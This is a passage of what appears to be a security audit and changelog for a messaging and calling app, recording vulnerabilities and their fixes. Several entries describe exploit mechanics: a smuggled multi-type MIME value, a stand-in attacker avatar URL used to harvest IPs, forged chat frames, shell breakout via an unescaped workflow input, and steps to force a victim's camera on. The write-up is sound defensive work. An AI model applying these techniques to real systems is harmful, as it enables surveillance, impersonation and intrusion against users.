**Problem.** Both did read → check `meta.consumedAt == null` in JS → write, with an `await` (the participant lookup) in between. Two concurrent reveals of the same view-once message therefore both observed "not yet consumed", both passed, and both returned the captured content — the same lost-update class as the S1 PIN-lockout and S9 OTP races. It also amplified H6: N racing reveals each triggered a full storage fetch and base64 inline of the same object.
**Fix.** A shared `burnExpiringMessage` helper performs one conditional `UPDATE` guarded on `JSON_EXTRACT(meta,'$.consumedAt') IS NULL`, with the verdict taken from `affectedRows`; only the winner receives the content.

## H8 — `avatarUrl` accepted arbitrary external URLs (MED)

**Where:** `server/v2routers.ts` `AvatarUrlSchema`.
**Problem.** `/^https?:\/\//` was permitted, making a profile photo a remote-fetch primitive aimed at other users' browsers — and the avatar renders on the **incoming-call ring card**, which appears with no interaction from the callee. An attacker could set their avatar to `http://their-host/x.png`, dial a victim, and harvest the victim's **IP address and User-Agent from a call the victim never answered**. It also fired from thread lists, contact rows, and in-call tiles, giving a passive read on when a target is looking at them. This is the same threat the status-background sanitizer already rejects `url(...)` for, and it cuts directly against this app's stated no-tracing goal.
**Fix.** Restricted to our own `/manus-storage/` path or an inline `data:image/`. No compatibility cost: every client path sets this from our own upload endpoint or clears it to null, and it is never re-sent on an unrelated profile edit; the schema gates writes only, so pre-existing rows keep rendering.

## H9 — `status.post` skipped its ownership gate for text statuses (MED)

**Where:** `server/v2routers.ts`.
**Problem.** The `keyInOwnerNamespace` check lived only inside the media-kind `else` branch, but `input.mediaKey` was persisted for **every** kind. Since `authorizeStorageKey` resolves a `/status_` key by looking up whichever *active* status row claims it — and grants access to that row's owner and audience, checked before the attachment branch — a `kind:"text"` post could claim another user's status key and **re-activate** it. An expired or deleted status, whose media is supposed to be permanently unreachable ("truly ephemeral at the access layer even though the object lingers in the bucket"), became readable again by the planter and re-exposed to the planter's own audience. Anyone who was in the original audience while it was live already knows the key. Same laundering class as F2.
**Fix.** The gate applies whenever a key is supplied, regardless of kind, and a text status never persists media at all.

## H10 — reservation-ledger duplicate detection matched on error text (LOW)

**Where:** `server/v2db.ts` `tryReserveNumber`.
**Problem.** The helper fails **open** (returns `true`) for anything it doesn't recognize, and recognized the duplicate-key case only by `/duplicate/i` against the human-readable message. A driver upgrade, a localized server, or a wrapped error would silently turn every lost race into "reservation won", reintroducing the cross-table number collision the ledger exists to prevent — with no visible sign.
**Fix.** Key on mysql's stable machine-readable markers (`errno === 1062` / `code === "ER_DUP_ENTRY"`) first; the text sniff remains only as a fallback.

## Verified clean (documented negatives)

Recorded so the negative result is trustworthy rather than merely unstated:

- **No SQL injection.** Every `sql` template interpolates either a Drizzle column reference (serialized as an identifier) or a value via `${}`, which Drizzle parameterizes. The only literal table/column names are hardcoded. `unreadCount` is also correctly floored with `GREATEST(… - 1, 0)`.
- **Landing-page XSS intact after the v2.99.35 React-19 `innerHTML` rework.** `escLp` escapes all five dangerous characters, is applied *after* name composition, and every interpolation site is element-text context; labels use `textContent`; the appended arrow SVG is a constant.
- **Secret comparison.** `timingSafeEqual` used consistently for passwords, HMACs, and webhook signatures, each with a length check first (and the inbound one additionally wrapped in try/catch).
- **CSRF genuinely defended.** All cookies are `SameSite=Lax`, so the cookie path of the raw `text/plain`-accepting `POST /api/v2/offline` beacon cannot fire cross-site; its `deviceId` body fallback requires a secret the attacker doesn't have.
- **`keyInOwnerNamespace` correctly anchored** — the trailing slash defeats the `relay-chat/1/` vs `relay-chat/12/` prefix collision — and the v2.99.x absolute-URL avatar fix is unexploitable: you cannot simultaneously satisfy the `lastIndexOf`-based namespace gate and the `isIdentityAvatarKey` suffix match with a victim's key.
- **`searchMessages` filters expiring content**, so view-once bodies never surface through search.
- **`tabPresence`** stores no secrets, rebuilds a fresh object (no prototype pollution), and fails safe toward a delayed offline rather than a stuck-online.

## Accepted residual (round 5)

- **`push.subscribe` endpoint re-bind.** The unique key is on `endpoint` alone, so `onDuplicateKeyUpdate` re-binds the row to the caller — meaning someone who *knows* a victim's endpoint can silently kill their notifications (the sibling of G3, which was fixed on the `unsubscribe` side). Deliberately **not** changed: no API ever returns an endpoint, the hijacker gains nothing readable (pushes are encrypted to their own keys, so the victim just receives undecryptable ones), and the only correct fix is a proof-of-possession challenge/response — new infrastructure. Naively refusing a re-bind to a different identity would break the *documented* account-switch-on-the-same-device flow, silently killing notifications for real users, which is a worse and far more common failure than the attack.
- All prior-round residuals stand unchanged.

## Verification (round 5)

`pnpm check` clean; `pnpm test` **1540 passing / 1 skipped**; `pnpm build` clean. New `server/hardeningPass5.test.ts` (44 tests) — including a real arithmetic **simulation of MySQL's left-to-right assignment order** so H4's off-by-one cannot silently return, and the actual attribute-breakout payloads H1's pin guard must reject. Four stale pre-existing source pins were updated to the corrected shapes rather than weakened (`m11ContentGating` ×2, `peerIdentityBatch`, `qaBatch8`).

## Round 5 pt.2 (same sweep, later-reporting classes)

The class-based sweep ran on a 4-core box, so its agents were capped at 2 concurrent and reported in waves. The findings above shipped as v2.99.37; these arrived after and shipped as v2.99.38.

### H11 — `RELAY_OTP_REGISTER_BYPASS` was unauthenticated account takeover (HIGH)

**Where:** `server/v2routers.ts` `otpAuth.register`.
**Problem.** The bypass branch called `findUserByEmailAny(email)` and signed the caller in as whatever it resolved. `register` is a `publicProcedure` whose entire input is a first name, last name, and email — so with the flag enabled, **anyone who knew a registered user's email address could obtain a full session as that user**: no code, no password, nothing to intercept. The trade this stopgap was accepted for (v2.97.2) was *"email ownership isn't proven at signup while it's on"*; unauthenticated takeover of every **existing** account was never part of that.
**Fix.** The branch is now **create-only**: it refuses with `CONFLICT` when the address already has an account, and only ever mints a new one — which keeps the flag's actual purpose (onboarding new users while SES is sandboxed) fully intact. Signing in remains `requestOtp` / `loginWithPin`, both of which still demand a real credential.
**Operator note.** The flag lives in `/home/relay/.env`, not in repo config, so its current production state isn't visible from the tree. It should be unset now that SES production access should be approved.

### H12 — `BLOCKED_MIME` bypass via a multi-valued Content-Type (HIGH)

**Where:** `server/v2upload.ts`.
**Problem.** `ALLOWED_MIME` and `BLOCKED_MIME` are both start-anchored, so each only ever inspected the **first** media type in the client-supplied `?mime=` value. `image/png,text/html` therefore passes `ALLOWED_MIME` (it starts with `image/`) and misses `BLOCKED_MIME` (it does not start with any blocked type). The value was stored and later replayed **verbatim as the `Content-Type`** of a same-origin response — exactly the stored-XSS shape `BLOCKED_MIME` exists to prevent, since header parsers disagree about which of several listed types wins.
**Fix.** New exported `normalizeMimeType` reduces the input to a canonical `type/subtype` essence (parameters dropped, case-folded) and requires it to be exactly **one** RFC 2045 token media type — no commas, no whitespace, no second type. Applied at both `mimeType` sources (raw query and legacy JSON body) *before* any allow/deny test or storage write, so the gates and the stored header operate on a value that cannot mean two things.

### H13 — account diversion: a second `users` row per email (MED)

**Where:** `server/authLocal.ts` `/api/auth/register`.
**Problem.** The other half of H2. `findLocalUserByEmail` deliberately matches only rows that *have* a `passwordHash`, so it is blind to OAuth and email-code accounts — and registration therefore inserted a **second** `users` row for an address that was already taken. Because `findUserByEmailAny` ranks a `local` row **above** a legacy OAuth row, the victim's email-code sign-in then resolved to the attacker's empty row. With the OAuth sign-in UI removed in v2.92, the email code is that user's only remaining way in, so their real account — number, contacts, message history — became unreachable. (H2's fix clears the planted credential so the attacker can't log in; this closes the other direction, where the victim is routed away from their own account.)
**Fix.** New `findAnyUserByEmail` refuses registration when **any** row already holds the address — one account per email. The unverified-local resend path is unchanged.

### H14 — gzip request-body amplification on `/api/v2/upload` (MED)

**Where:** `server/_core/index.ts`.
**Problem.** body-parser inflates `Content-Encoding: gzip`/`deflate` request bodies by default and enforces `limit` against the **decompressed** stream. The 41 MB ceiling therefore still held, but the attacker's cost to reach it collapsed by roughly three orders of magnitude: a few tens of KB of compressed zeros expands to the full 41 MB of server-side buffering. That compounds the known ordering weakness on this route — the per-IP/per-identity upload rate limit lives *inside* the handler, so it only runs after the body has already been buffered.
**Fix.** `inflate: false` on both upload parsers. No client compresses an upload body (browsers never gzip request bodies on their own; the native app streams raw bytes), so refusing encoded bodies here has no functional cost.

### H15 — storage-proxy rate limiter was never swept (LOW)

**Where:** `server/_core/storageProxy.ts`.
**Problem.** Every other limiter in the codebase pairs itself with a periodic `sweep`; this one shipped without one, so its per-IP `Map` grew for the entire process lifetime — one entry per distinct IP that ever loaded a single image, never released — on the app's only fully anonymous, high-fan-out endpoint.
**Fix.** Added the matching 30-minute sweep.

### Verification (round 5 pt.2)

`pnpm check` clean; `pnpm test` **1555 passing / 1 skipped**; `pnpm build` clean. `server/hardeningPass5.test.ts` grows to 59, including behavioral `normalizeMimeType` coverage of the actual bypass payloads (comma-lists, whitespace, case variants) and a check that normalization does not launder a dangerous type past the blocked list.

## Round 5 pt.3 (final sweep classes)

12 of the 14 class agents reported in the end. These are the findings from the last wave, shipped as v2.99.39.

### H16 — the PIN lockout was bypassable by concurrency (HIGH)

**Where:** `server/authPin.ts` `attemptPinLogin`, reached from `otpAuth.loginWithPin`.
**Problem.** The lockout gated on `row.loginPinLockedAt` — a field from a snapshot the **caller** had already read (`loginWithPin` does its own `findUserByEmailAny`) — and then ran `verifyPassword` regardless of the row's live state. N simultaneous requests therefore all observed an unlocked row, all passed the gate, and all had a PIN checked.

This is the half of S1 that the earlier fix did not reach. S1 made the *counter* race-free, which stopped increments being lost — but it never bounded how many **verifications** could occur, so "three tries then lock" was not actually enforced per attempt. A burst could test a large fraction of the 10⁴ PIN space in one window, held back only by the per-IP `otpGate` bucket rather than by the cap itself.

**Fix.** Inverted the order so the database, not a snapshot, is the gate. Every attempt must first **win a slot**:

```
UPDATE users SET loginPinAttempts = COALESCE(loginPinAttempts,0) + 1
 WHERE id = ? AND loginPinLockedAt IS NULL
   AND COALESCE(loginPinAttempts,0) <= PIN_MAX_ATTEMPTS
```

with the verdict taken from `affectedRows`; only a winner is allowed to call `verifyPassword`. MySQL serializes that per row, so at most `PIN_MAX_ATTEMPTS + 1` verifications can ever happen between unlocks — regardless of how many requests arrive at once, how they interleave, or which instance they hit. The documented ladder is preserved exactly: the fourth try is still verified (so a correct fourth entry still succeeds), and a wrong fourth latches the lock through its own `IS NULL`-guarded UPDATE, which also owns sending the alert email exactly once.

The pure `judgePinAttempt` helper is referenced only by tests; it decides from a snapshot *by design*, so it now carries an explicit "ADVISORY ONLY — NOT AN ENFORCEMENT PATH" warning to stop it being wired into a login route later.

### H17 — an unsolicited `video-accept` forced a peer's camera on (HIGH)

**Where:** `client/src/lib/relayClient.ts` `onVideoAccept`.
**Problem.** The handler checked nothing but `inCall`, then called `unlockApprovedVideo()`. Any participant in a call could therefore send an unsolicited `video-accept` frame and switch the recipient's camera on mid-voice-call — a complete bypass of the v2.81 mutual-consent protocol, whose entire promise is that a camera transmits only after both sides agree. The victim's only notice was a cheerful "Video is on — both sides 🎥" toast. On a party line, which is joinable by number, one frame could do it to every participant at once.
**Fix.** A new per-call `videoOfferedByUs` flag, required before an accept is honoured. `videoReqT` alone would not do: there are **two** legitimate ways to receive `video-accept`, and only one involves an outstanding request — a video **dial** answered with the Video button also replies `video-accept`, and there the caller's consent was implicit in dialing, with no `video-request` ever sent. `outgoingDial` can't stand in either, since it is cleared at establishment while consent frames often arrive before the transport exists. The flag is set at both consent points and cleared by the existing per-call reset; an unsolicited accept is dropped **silently**, so the frame reveals nothing about whether it landed.

### H18 — attacker-chosen `Content-Type` served same-origin (HIGH)

**Where:** `server/v2upload.ts` `BLOCKED_MIME` + `server/_core/storageProxy.ts`.
**Problem.** The proxy relays the stored content type verbatim, and that type is whatever the uploader supplied. `X-Content-Type-Options: nosniff` stops the browser guessing — but it also means the **declared** type is obeyed, which is the problem rather than the cure. So the upload denylist was the only real defence, and it was a denylist over an allowlist that admits `text/*` and `application/*` wholesale. The entire XML family was missing: a document served as `text/xml`, `application/xml`, `text/xsl` or `application/xslt+xml` is parsed as XML, and XML carrying SVG or XHTML namespaces with a `<script>` element executes in some browsers — precisely the outcome `image/svg+xml` is blocked for. The other JavaScript media types (`text/javascript`, `application/ecmascript`, `application/x-javascript`) were missing too; only `application/javascript` was listed.
**Fix.** Both layers. The denylist now covers the XML and script families. Independently, the proxy serves only an **inline-safe set** (common image/video/audio types plus `application/pdf`) as itself and downgrades anything else to `application/octet-stream` with `Content-Disposition: attachment`. A file the browser saves cannot execute in our origin, which makes the mitigation robust without needing to enumerate every dangerous type — and it also covers rows stored *before* the denylist was tightened. It matches how the client already presents attachments (media inline, documents as a download card), so it costs nothing in practice.

### H19 — `auth.me` shipped the caller's credential hashes to the browser (MED)

**Where:** `server/routers.ts`.
**Problem.** `getUserById` performs an unprojected `db.select()`, and `auth.me` returned `ctx.user` verbatim — so every call serialized the caller's entire `users` row, including their scrypt `passwordHash` and their `loginPinHash`. Those then live in JS memory, the React Query cache, devtools/HAR captures, anything a browser extension can read, and any client error report that captures query state. It is the caller's own hash, so this is not cross-user disclosure — but it converts any read-only client-side foothold (an XSS such as H1, a malicious extension) into offline credential cracking, and the PIN hash covers only 10⁴ possibilities, so recovering it effectively hands over the account.
**Fix.** Both fields are stripped before the response. Done as a **denylist** rather than an allowlist projection so no field the client already consumes can silently disappear; server-side callers that genuinely need the hashes read them from their own query, not from `ctx.user`.

### H20 — the signaling offline dial was an enumeration oracle and a spam amplifier (MED)

**Where:** `server/relay.ts`, the `invite` handler's offline-resolution branch.
**Problem.** Two issues on one path. Its replies differ *by design* — `"<Name> is offline right now."` for a real identity versus `"That number doesn't exist."` for an unknown one — so it leaks both existence and display name across the whole 10⁶ number space. The tRPC resolvers were gated for exactly this in F5 (`directoryGate`, 120 burst / ~60 per minute), but this path never was, and the signaling limiter is a **flood** guard (~200/s) that a scraper simply stays under: full enumeration in well under two hours. Separately, each pass also calls `onMissedCall`, writing a History row and firing a missed-call push **and email** at the target — and unlike the offline-*message* email there is no cooldown on it, making this a mailbox flood against a third party, driven by a stranger, plus a sender-reputation risk for the operator's domain.
**Fix.** A per-caller-pin `offlineDialLimiter` (20 burst, ~1 per 4s), scoped **only** to this branch. A dial to an online user never reaches it, so normal calling and group dials — which fan many invites at once — are untouched; that scoping is what makes this acceptable where the previously-rejected idea of capping invites in general was not. The throttled reply is the generic offline message, and it returns before resolving the identity or recording any miss.

### H21 — `identity.regenerateNumber` had no throttle (MED)

**Where:** `server/v2routers.ts`. The sibling of H5. Each call permanently claims another of the ~980,000 six-digit numbers, and the old one is never recycled (`numberTaken` treats any existing row as taken; the M20 ledger is monotonic) — so a single authenticated account could drain the shared space and break allocation for every future signup. Now behind the same mint budget.

### Verified and queued (not changed in this pass)

Confirmed against source but deliberately not rushed into the same commit — several sit in the call-setup path, the most delicate code in the app:

- signaling `knock-approve` does not re-check that the approver is still in the room, and `kick` does not revoke co-host;
- in-call chat trusts the frame's self-declared sender name (impersonation — cosmetic next to the XSS in H1, which is fixed);
- `ensureUserIdentity` is a check-then-insert with no unique index on `identities.userId`;
- the Dialer's `?to=` parameter places an outgoing call with no user gesture;
- member sign-out does not revoke its session-ledger row, and password logins mint sid-less cookies;
- `/api/relay/send` resolves the full identity context before the rate-limit check.

### Product decision, not a defect

The status audience rule means **anyone who saves your six-digit number can see your story posts** — contacts are self-service with no consent step, so this is viewer-granted rather than owner-granted visibility. That is a product choice about how `status` is scoped, not a bug, so it is flagged here rather than changed.

### Verification (round 5 pt.3)

`pnpm check` clean; `pnpm test` **1582 passing / 1 skipped**; `pnpm build` clean. New `server/hardeningPass6.test.ts` (22) plus M36 coverage in `hardeningPass5.test.ts`, including a simulation of the DB guard proving a 10,000-request burst yields exactly `cap + 1` PIN verifications, and behavioural coverage of the real `BLOCKED_MIME` and `INLINE_SAFE_TYPE` predicates. Three stale pins were retargeted to the new mechanisms rather than weakened.

### Correction to H11 (register bypass) — superseded by removal

H11 hardened the `RELAY_OTP_REGISTER_BYPASS` branch to be create-only. Between that shipping and this round, the stopgap was **deleted outright** (v2.99.39) because AWS approved the operator's SES production access on 2026-07-24: registration now always mints and emails a real verification code, and the account is created only by `verifyOtp`. Removal strictly supersedes the hardening — there is no branch left to get wrong, and a stale `RELAY_OTP_REGISTER_BYPASS=1` in a server `.env` has no effect because nothing reads it. The operator note attached to H11 ("worth unsetting the flag") is therefore resolved. H11's regression test was retargeted to pin the absence of the branch rather than the shape of its guard.

## Round 5 pt.4 — sweep complete

The class-based sweep finished: **14 of 14** hunter classes reported, and the three-lens adversarial panel returned **55 verdicts — 51 refuted, 4 upheld**. That refutation rate is the panel doing its job; it killed 51 plausible-but-wrong claims that would otherwise have consumed review time or produced churn. This section covers the final wave plus the panel's survivors, shipped as v2.99.41.

### H22 — ReDoS on the inbound-email webhook (MED)

**Where:** `server/emailInbound.ts` `parseInboundAddress`.
**Problem.** The function ran `/<([^>]+)>/` against an untrusted header value with **no length cap**, on a route that accepts 5 MB of JSON. On input containing a `<` but no `>`, the engine lets `[^>]+` run to the end of the string from every `<` position, fails to find `>`, then gives back one character at a time — quadratic, on the order of 10¹³ steps for a 5 MB payload. Node is single-threaded and this process serves every SSE stream, every signaling POST and the whole API, so **one** request stalls calls and messaging for every user. The webhook signature check is opt-in (`INBOUND_EMAIL_WEBHOOK_SECRET`), so this can be unauthenticated.

This was the panel's highest-confidence new finding; the verifier reported it had "verified the sink empirically three ways" and failed to refute it at any guard.

**Fix.** Reject anything over 1024 bytes before the match. RFC 5321 caps an addr-spec at 320 bytes and a display-name plus angle-addr is still far under this, so nothing legitimate is affected — and bounding *n* makes the regex's worst case irrelevant, which is more robust than trying to write a cleverer pattern.

### H23 — `region` was still spliced raw into the SSM commands (MED) — a gap in H11's own fix

**Where:** `.github/workflows/aws-ops.yml`.
**Problem.** The earlier fix base64-encoded `SES_EMAIL` and `DOMAIN`, but `region` is the **third** free-text `workflow_dispatch` input on the same code path and was missed. It remained interpolated unescaped into all five command strings executed on production EC2 via SSM `RunShellScript`, so a value containing a quote or semicolon breaks out exactly as the other two did and runs arbitrary commands under the instance role.

Worth recording plainly: this is an incomplete remediation of my own, found only because the sweep re-examined the file by a different lens. Fixing two of three inputs on a path is not fixing the path.

**Fix.** Same encode-on-runner / decode-on-instance treatment, applied to all five commands. The input's *other* uses (`configure-aws-credentials`, runner-local `aws` calls) run directly on the runner via safe single-pass substitution and never cross into a second shell, so they are deliberately left alone.

### H24 — sign-out never revoked the session ledger row (LOW, upheld)

**Where:** `server/routers.ts` `auth.logout`.
**Problem.** v2.99.1 introduced a revocable session ledger, and `createContext` gates every sid-bearing cookie on it — but sign-out only ever cleared cookies, leaving the row **active**. Two consequences: the device kept appearing in the user's own "Devices" list as a live session (the 30-minute reaper only drops rows idle past the cookie TTL), and the token itself remained valid, so a copy recovered from a synced browser profile, a disk backup, or a shared machine would still authenticate. "Log out" has to mean the credential stops working, or the revocable-session model is decorative.
**Fix.** Revoke the caller's own row by `sid` (already available as `ctx.sessionSid`), wrapped so a DB hiccup can never prevent the cookies being cleared.

### H25 — the media-proxy limiter was too tight for shared egress (availability, not a vulnerability)

**Where:** `server/_core/storageProxy.ts`.
**Problem.** The per-IP budget was 240 burst / 4 per second. Any shared egress puts many real users behind one address — carrier CGNAT, an office, a school, a café — and RELAY is an image-heavy chat, so a handful of people scrolling media threads together could exhaust the burst and then be rationed. A throttled media request renders as a **broken image**, which is precisely the user-visible symptom this project has repeatedly chased.
**Fix.** Raised to 600 / 20 per second. The guard's real target is DB-CPU cost on the miss path (the avatar rescue does a `LIKE '%/manus-storage/<key>'` scan), **not** key enumeration — keys carry a random hex suffix and cannot be guessed — so a higher ceiling still caps a scraper two orders of magnitude below unlimited. Recorded here because loosening a security control deserves the same scrutiny as adding one.

### Verified and downgraded on independent checking

The sweep reported that Android release builds of the production `applicationId` are signed with the committed debug keystore. `mobile/native/android/app/build.gradle` does say `release { signingConfig signingConfigs.debug }`, and `debug.keystore` is committed with the well-known password — so the claim is literally true of the Gradle config. But `native-rn.yml` **re-signs the AAB after the build** with a real keystore from `ANDROID_KEYSTORE_BASE64` (skipping signing entirely when the secret is absent), so the store artifact is properly signed. It is a genuine footgun — a locally built "release" APK is debug-signed and could be mistaken for distributable — but not a live compromise. Left as an operator note rather than changed blind, since editing signing config without knowing the real keystore setup risks the release pipeline.

### Left to the operator (not fixable from the repo)

- **The deploy OIDC role trusts `repo:…:*`** — a workflow on *any* branch can assume the production deploy role. That is an AWS IAM trust-policy edit (scope it to the default branch and/or an environment), not a code change.
- **`deploy.yml` pins third-party actions to mutable major tags** in the job that holds production deploy credentials. Pinning to immutable commit SHAs is the fix; doing it requires verified SHAs, and guessing one would break the deploy pipeline.

### Verification (round 5 pt.4)

`pnpm check` clean; `pnpm test` **1638 passing / 1 skipped**; `pnpm build` clean. `server/hardeningPass6.test.ts` grows to 35, including a bounded-regex timing check on the worst accepted input and per-command assertions that every SSM command decodes the region rather than interpolating it.

## Round 5 pt.5 — the verified-and-queued list

Five items were confirmed during the class sweep but deliberately held back from the pass that shipped three HIGH fixes, because four of them sit in the call path — the most delicate code in the app — and bundling them behind one version bump would have been a bad trade against a green suite. Taken here one at a time and shipped as v2.99.43. **One turned out to be wrong on inspection and is recorded below as a refutation rather than a fix.**

### H26 — moderator powers outlived room membership (MED)

**Where:** `server/relay.ts`, the `knock-approve` / `knock-deny` and `mod`→`kick` handlers.
**Problem.** Two defects that chain into one.

`knock-approve` gated only on `isModerator(meta, conn.pin)` — but it takes `roomId` from the **client**, and `roomMeta` outlives membership (the roster is add-only, and nothing clears `hostPin`/`cohosts` when someone leaves). So a **former host** who had already hung up could name the old room and admit an outsider into a call they were no longer part of. Note the asymmetry that hid this: the `mod` handler derives its room from trusted server state (`self.roomId`) and is therefore inherently bound to the caller's live call; this handler is not.

Worse, `kick` called `leaveRoom(reg, target)`, which only drops membership — it never touched `meta.cohosts`. A **kicked co-host therefore kept their role**, could knock (permitted, since they were in the roster), and could then satisfy both of `knock-approve`'s gates to **approve themselves straight back in**. The kick was undoable by its own target.

**Fix.** `knock-approve` additionally requires `room.has(conn.pin)`. Membership is the right test rather than `rid === self.roomId`, because a host whose call is on **hold** is still in the room's member Set (v2.97.1) and must remain able to approve. And `kick` now revokes the target's co-host role and any pending knock before removing them, then broadcasts `role: null` so no client keeps rendering host controls for them.

### H27 — in-call chat trusted the frame's self-declared sender (MED)

**Where:** `client/src/lib/relayClient.ts` `receiveChatFrame`.
**Problem.** A chat frame is just JSON on a data channel, and both `name` and `pin` were read straight out of it. Any participant could publish `{name:"Alice", pin:"<alice's pin>", text:"…"}` and have it render as a message from Alice — **including her avatar**, since the identity chip resolves the photo by pin. On a party line it could be aimed at everyone at once.
**Fix.** Both transports already know who actually sent the bytes: the mesh has one data channel **per peer** (so `setupDC`'s `pin` is authenticated by the channel itself), and LiveKit hands `DataReceived` the sending participant, whose identity comes from the server-minted join token. `receiveChatFrame` now takes that proven identity, prefers it over anything the frame claims, and resolves the display name from the roster (`nameOf`). The parameter is optional so any legacy caller degrades to the old behaviour rather than dropping messages.

### H28 — duplicate identities per user (MED, data integrity)

**Where:** `server/v2db.ts` `ensureUserIdentity` / `getIdentityByUserId`.
**Problem.** `ensureUserIdentity` is a check-then-insert (read by `userId`, else create a fresh identity **with a new 6-digit number**) with no unique constraint behind it. Two concurrent sign-ins for the same account — a double-tapped Sign in, two devices at once, an OTP verify racing a PIN login — could each observe "no identity yet" and each mint one. On top of that, `getIdentityByUserId` used a bare `.limit(1)` with **no ordering**, so MySQL could return either row per query.

The user-visible result is the long-standing report in this project's own history: *"my number changes randomly"* / *"this device shows a different number"* — plus messages and contacts splitting across two identities, and an extra number burned from the finite space.

**Fix.** Layered, because the two halves solve different problems. `orderBy(asc(identities.id))` makes resolution **deterministic even where duplicate rows already exist in production**, so every surface immediately agrees on one identity. A `UNIQUE` index on `identities.userId` (boot migrator) then stops new duplicates being created at all. NULL is repeatable under a MySQL unique index, so guest identities are entirely unaffected; and because the migrator catches per item, a deployment that already contains duplicates logs and boots normally rather than failing — the index lands on the next boot after reconciliation.

### H29 — `?to=` placed a call with no user gesture (MED)

**Where:** `client/src/pages/app/Dialer.tsx`.
**Problem.** The Dialer auto-dials `?to=<pin>` so that tapping "call" in Messages/Contacts connects immediately — but the effect could not distinguish an in-app route change from a user **arriving** on that URL. Microphone permission is granted per-origin and persists, so for any regular RELAY user a link such as `https://<host>/app/dialer?to=<attacker-pin>` turned a single click into a live outbound call to a number the attacker chose, with `getUserMedia` succeeding silently, `?video=1` adding the camera, and the attacker's side free to auto-answer.
**Fix.** A route module cannot make this distinction itself: `Dialer.tsx` is lazily loaded, so its module scope is first evaluated *at* the navigation in question, by which point `window.location.search` carries `?to=` either way. New `client/src/lib/bootUrl.ts` is imported by `main.tsx` and therefore evaluated exactly once when the document boots, before any routing — a `to=` present there means the user arrived on the URL, so the pad is **prefilled** instead (one deliberate tap).

Verified that the in-app paths are unaffected: `/i/:pin` uses wouter's client-side `<Redirect>` and Contacts/Messages use `setLocation`, so `to` is not in their boot URL and they still connect immediately. The one legitimate full-page navigation — the *"<name> is back online — tap to call them now"* alert the user explicitly armed — keeps its single tap through a one-time, same-origin `sessionStorage` intent marker, which a link cannot forge and cannot carry to somebody else.

### Refuted, not fixed

**"`/api/relay/send` resolves the full identity context before checking the rate limit."** It does not. The limiter is `app.use` middleware on that path registered at `server/_core/index.ts:141`, and `attachRelay` is called at `:206`; Express runs middleware in **registration order**, so the limiter already precedes the POST handler that calls `createContext` — and only a `register` message calls it at all. Pinned as a refutation in `hardeningPass7.test.ts` so the claim is not re-raised.

### Verification (round 5 pt.5)

`pnpm check` clean; `pnpm test` **1703 passing / 1 skipped**; `pnpm build` clean. New `server/hardeningPass7.test.ts` (24), including a behavioural check that a forged chat pin loses to the transport-proven one. Two stale pins were updated to the new shapes rather than weakened: `contacts.test.ts`'s additive-DDL rule now admits `ADD UNIQUE INDEX`, and `androidAudioCamera.test.ts`'s chat-dedup pin now expects the threaded sender identity.

---

## Round 6 — red-teaming my own fixes (2026-07-24, v2.99.47)

Rounds 1–5 hunted vulnerabilities. This round asked a different question of the
29 fixes shipped that day: **how did each one make the app worse for a
legitimate user, or leave the invariant it claimed only half-shut?** Security
work that breaks calling is a net loss, and a fix that only *looks* closed is
worse than a known gap. Eight items survived verification.

The most important result is that **one of the fixes did not actually close its
hole**, and two others broke working features.

### The fix that was still open — forced camera-on (MED)

**Where:** `client/src/lib/relayClient.ts`.

M37 gated `onVideoAccept` on a boolean, "did we offer video?", cleared in
`hangUp`. But **a call can be left without hanging up**: `switchCall` abandons an
unanswered outgoing dial with a bare `leave`, and `parkActiveAsHeld` / `swapCall`
move the active call to hold. So the offer survived into the *next* call:

1. Victim taps **Video call** on a contact — the flag is set.
2. While it rings unanswered, the attacker dials the victim.
3. Victim taps **"End call & answer"** — `switchCall` joins the attacker's room,
   flag intact.
4. Attacker sends one `{type:"video-accept"}` frame. The victim's camera turns on
   and publishes, with "Video is on — both sides 🎥" as the only notice.

**Fix.** Keyed to the **room** the offer was made for, not to a lifecycle hook:
`videoOfferPending` + `videoOfferedForRoom`, and `onVideoAccept` requires
`videoOfferedForRoom === roomId`. A pending offer is bound **only** by the `room`
ack — the server's reply to our own invite, the one place a room is provably the
one our dial created. Every other way of entering a room leaves it unbound, so it
matches nothing. The guarantee no longer depends on remembering to clear a flag
at each exit, and a forgotten binding fails *closed* (video simply doesn't
auto-enable). `resetVideoConsent()` at the switch points additionally stops
`videoApproved` leaking, which mattered on its own: it disables the gate, so a
still-live camera would publish to a new peer with no agreement.

### Regressions in my own fixes

| ID | Sev | From | What broke |
|----|-----|------|-----------|
| **M53/M56** | MED | M45 | M45's `room.has(approver)` gate was correct, but `hostPin` never moved when the host left — so History's "Live now · Join" prompted an absent host whose Approve tap hit the gate and returned **silently**. Fixed with host succession in `leaveRoom` (co-host first, else longest-standing connected member; ghosts skipped) plus non-silent refusals. The reply uses a **new** `knockfail` code, not `forbidden`/`gone`: those are in the client's fatal sets and would have hung up the approver's own call. |
| **M52** | MED | M38 | The widened upload denylist rejected everyday `.xml` / `.js` attachments (the Messages paperclip has no `accept` filter). The same M38 change had already fixed this at the serving end — the proxy downgrades every non-inline-safe type to an octet-stream attachment — so the widening was redundant *and* costly. Restored to the pre-M38 set. |
| **M55** | LOW | M40 | The throttled dial replied `offline`, which is voicemail-eligible — so a mistyped number offered "leave a voice message", recorded up to 60s, then failed with the recording lost. Now `unavailable`: unreachable, never voicemail-eligible, still leaks nothing. |
| **M49** | LOW | M36 | M36 splits claim-then-latch; a death in between (pm2 restarts on every push, across the ~100 ms scrypt verify) left `attempts=4, lockedAt=NULL` — refusing even the **correct** PIN while `loginProbe` reported `locked:false`. New `pinSlotsSpent()` derives the state from both fields; the no-slot branch heals the row into a real, visible lock and sends the alert the interrupted attempt owed. |
| **M51** | MED | M29+M35 | M29's wipe is correct and stays (the server cannot tell a self-registration from an attacker pre-registering someone else's address). But the 409 that followed said "sign in instead", pointing at a password login that 401s forever with no reset route in the app. It now names the way in: "signs in with an email code". |

### Incomplete closures

| ID | Sev | What was still open |
|----|-----|---------------------|
| **M54** | MED | v2.99.44 closed the 65 s group-dial hang for three replies but not the two in the async offline branch (`nonexistent`, the resolver-failure `.catch`), which carried no `pin` — and the client drains outstanding invitees *by pin*. A group dial including one unregistered number still hung. Both fixed; the pin that counted three sites now asserts the class invariant. |
| **M50** | MED | M35 closed duplicate accounts at `/api/auth/register` but not at the OTP door: `consumeOtp` was an unguarded UPDATE, so two verifies of the same code both reached `createOtpUser`, and `users.email` has no unique index. A later sign-in could then land on the orphan row — the exact diversion M35 prevents. Now an atomic claim (`isNull(consumedAt)` + `affectedRows`), with `verifyOtp` refusing a lost race before creating anything, plus `ORDER BY id` so historical duplicates resolve stably. |

### Accepted residuals

- **No password-reset route.** No client posts to `/api/auth/*`; adding a way to
